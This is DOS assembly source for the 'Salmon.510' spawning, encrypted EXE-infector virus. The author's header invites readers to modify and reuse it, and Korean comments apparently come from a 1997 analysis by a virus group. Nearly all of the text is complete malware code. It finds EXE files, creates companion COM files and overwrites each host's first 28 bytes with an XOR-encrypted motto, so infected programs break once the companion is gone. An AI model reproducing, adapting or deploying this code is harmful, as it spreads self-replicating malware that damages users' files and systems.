;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                        Salmon.510 virus                       CVC #01, 97/06
;                        ****************
;
;  이름 : Salmon.510
;  제작자 : Nemisis
;  분석 : Osiris of CVC,Corea / 1997.05
;  종류 : 비상주형  산란형
;  출처 : Nemesis Issue #01
;
; Happy Salmon - Like fish, we spawn and die.
; Spawning, Encrypted EXE Infector
;
; This virus is silly. It has no purpose, point, or meaning. I was bored
; and felt like making something. It lacks any real content or even a
; decent directory traversal routine. Adding one would make the virus more
; effective at spreading. At 510 bytes, the virus tips the scales.
;
; Upon finding an EXE file to infect the virus creates a COM companion file.
; It then proceeds to copy over the first 16 bytes of the file with the motto.
; Without the COM file to fix-up the EXE at runtime the EXE's are effectively
; trashed. The virus is encrypted to prevent easily making a patch to remove
; the virus from afflicted EXE programs. There is no "destructive" code so
; to speak.
;
; Feel free to mod/rip; that's why you have it!
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
code    segment public 'code'
        assume  cs:code,ds:code,es:code,ss:code
        org     100h
        jumps

start:
       call     encrypt                 ; 암호 풀기

virus:
       mov      byte ptr flag,1         ; Fixup!
       call     fixup_fuckup            ;

       mov      bx,offset endheap       ; 바이러스의 끝
       shr      bx,4                    ; 패라그래피 단위로 나눔
       inc      bx                      ; +1
       mov      ah,4Ah                  ; 메모리 크기 재조정
       int      21h                     ;

       mov      stackseg,ss             ; 스택 저장 (SS:SP)
       mov      stackptr,sp             ;

       mov      sp,offset endheap-offset start+100h ; SP 재지정

; Int 2Eh - SI Offset 0 = Size of String Not Including CR
;           SI Offset 1 = String (gotta love that interrupt guide)

       mov      si,offset spawn          ; 산란이름
       int      2Eh                      ; 실행

       mov      ss,stackseg              ; Stack 복구
       mov      sp,stackptr

       push     cs                      ; cs=ds=es
       pop      ds
       push     cs
       pop      es

       mov      byte ptr flag,0         ;
       call     fixup_fuckup            ; Fuckup!

       mov      ah,47h                  ; 현재 디렉토리 얻기
       xor      cx,cx
       mov      si,offset curdir
       int      21h

       mov      ah,2Ch                  ; 암호화 할 값 얻기
       int      21h
       mov      word ptr encval,dx

       mov      dx,offset dta           ; 새로운 DTA 설정
       mov      ah,1Ah
       int      21h

       mov      dx,offset exespec       ; EXE 파일 찾기
       mov      ah,4Eh                  ; (*.E*)

find_file:
       int      21h
       jc       drop_dir

       call     baby_maker              ; 동일 한 COM 파일 생성

       cmp      byte ptr run,3          ; 3 개를 감염시켰나 ?
       jge      quit

find_next:
       mov      ah,4Fh                  ; 다음 파일 찾기
       jmp      short find_file

drop_dir:
       mov      ah,3Bh                  ; 상위 디렉토리로 이동
       mov      dx,offset dotdot
       int      21h
       jc       quit
       ret

baby_maker:

       mov      si,offset dta+30        ;
       mov      di,offset asciiz        ;
asc:
       lodsb
       stosb
       cmp      al,0                    ; 끝 ?
       jne      asc

       mov      si,offset dta+30
       mov      di,offset spawn+1
       mov      dx,di
       xor      ax,ax

exe2com:
       lodsb                            ; SI->AL
       stosb                            ; AL->DI
       inc      ah                      ; 증가
       cmp      al,'.'                  ; 확장자 검사
       jne      exe2com

       mov      word ptr [di],'OC'      ; COM 집어 넣기
       mov      word ptr [di+2], 04Dh   ;

       add      ah,3                    ; For Extension
       mov      byte ptr offset spawn,ah

       mov      cx,00100011b            ; 동일 이름의 COM 파일 생성
       mov      ah,05Bh                 ; 3Ch 와 다르게 이기능은 파일이 존재하
       int      21h                     ; 면 실패한다.
       jc       find_next               ; 파일이 존재 하나 ?

       inc      byte ptr run            ; 감염횟수 증가
       xchg     bx,ax                   ; BX = 파일 핸들

       mov      word ptr [di], 'XE'     ;
       mov      word ptr [di+2], 0D45h  ; CR+'E' Make Back Into EXE File

       mov      ah,40h                  ; 쓰기
       mov      dx,offset start
       mov      cx,offset virus-start
       int      21h                     ;

       inc      word ptr encval         ;

       mov      byte ptr flag,0         ;
       call     fixup_fuckup

       call     q_encrypt               ; 암호화 & 쓰기

       mov      ah,03Eh                 ; 파일 닫기
       int      21h                     ;
       jmp      short quit

fixup_fuckup:
       push     bx

       mov      dx,offset asciiz        ;
       mov      ax,3D02h                ; 원래 EXE 파일 열기
       int      21h                     ;

       xchg     bx,ax                   ; BX=파일 핸들

       mov      ax,4200h                ; 처음으로 이동
       xor      cx,cx                   ; (쓸데 없는 명령들임...)
       cwd                              ; 파일 오픈시 원래 기본적으로 포인터는
       int      21h                     ; 처음임

       cmp      byte ptr flag,1         ; flag 가 1 이면 복구
       je       fixup

       mov      ah,3Fh                  ; EXE 파일의 앞부분 읽기
       mov      cx,28                   ; 산란형 바이러스이지만 단순히 COM 파일
       mov      dx,offset bbyte         ; 을 제거 하는 것만으로는 치료 할 수없
       int      21h                     ; 다. 원래 EXE 파일의 앞부분을 산란된
                                        ; COM 파일 내부에 저장하기 때문이다.
       mov      ax,4200h                ;
       xor      cx,cx                   ;
       cwd                              ;
       int      21h                     ; 파일의 첨으로 이동

       mov      cx,14                   ;
       mov      si,offset motto         ;
       mov      di,offset xorred_motto  ;
       mov      dx,sp                   ; An Nice Way to Get Encrypt Value

fuck_motto:
       lodsw                            ;
       xor      ax,dx                   ; 암호화
       stosw                            ;
       loop     fuck_motto              ;

       mov      ah,40h
       mov      dx,offset xorred_motto
       mov      cx,28
       int      21h                     ; Overwrite 28 Bytes With Motto
       jmp      short close

fixup:
       mov      ah,40h                  ; 원래 앞부분 복구
       mov      dx,offset bbyte
       mov      cx,28
       int      21h                     ;
close:
       mov      ah,03Eh
       int      21h
       pop      bx
       ret

quit:

       mov      ah,3Bh                  ; 원래 디렉토리로 이동
       mov      dx,offset curdir
       xor      cx,cx
       int      21h

       mov      ah,4Ch                  ; 끝내기
       int      21h

exespec   db     '*.E*',0               ; EXE 파일 찾기
spawn     db     13,13 dup(0),13        ; 파일 이름

vname     db    '[Happy Salmon]'        ; 바이러스 이름
vwhom     db    '[Nemesis]'             ; 제작자
vwhere    db    '[USA]'                 ; 제작지
motto     db    'Like fish, we spawn and die.'
bbyte     db     28 dup (0)
asciiz    db     13 dup (0)
dotdot    db    '..',0                  ; 상위 디렉토리로 이동

;
;
q_encrypt:
       mov      si,offset move_str      ;
       mov      di,offset space         ;
       mov      cx,offset move_end-move_str
       rep      movsb                   ; Move The Next Routine Into
                                        ; Memory
       mov      dx,offset space
       call     dx                      ; Call The Copied Routine
       ret

move_str:
       mov      dx,offset encrypt
       call     dx                      ; 암호화

       mov      dx,offset virus         ; 바이러스 쓰기
       mov      cx,offset heap-virus    ; 길이
       mov      ah,40h
       int      21h                     ; 쓰기

       mov      dx,offset encrypt
       call     dx                      ; 암호 풀기
       ret
move_end:

encrypt:
       mov      di,word ptr encval      ;
       mov      si,offset virus
       mov      cx,(offset move_end-offset virus)/2
xorit:
       xor      word ptr [si],di
       inc      si
       inc      si
       loop     xorit
       ret
encval    dw     0

;------------[디스크에 저장안되는 부분]--------------------------------------
heap:
dta              db     42   dup (?)           ; New DTA
stackseg         dw     ?
stackptr         dw     ?
space            db     offset move_end-offset move_str dup(?)
run              db     ?
flag             db     ?
curdir           db     64  dup (?)
xorred_motto     dw     14  dup  (?)
endheap:

code ends
end start
